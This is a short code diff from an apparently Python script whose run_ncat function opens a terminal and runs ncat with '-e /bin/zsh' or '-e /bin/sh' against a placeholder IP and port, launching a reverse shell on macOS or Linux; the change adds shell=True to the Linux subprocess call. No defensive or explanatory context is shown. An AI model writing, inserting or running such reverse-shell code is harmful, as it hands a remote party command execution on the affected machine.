@@ -76,7 +76,7 @@ def run_ncat():
         os.system("""osascript -e 'tell application "Terminal" to do script "ncat <ip> <port> -e /bin/zsh"'""")
     elif sys.platform.startswith("linux"):
         #linux
-        subprocess.run(["gnome-terminal", "-e", "ncat <ip> <port> -e /bin/sh"])
+        subprocess.run(["gnome-terminal", "-e", "ncat <ip> <port> -e /bin/sh"], shell=True)
     
 
 # Start the tang listener in a separate thread
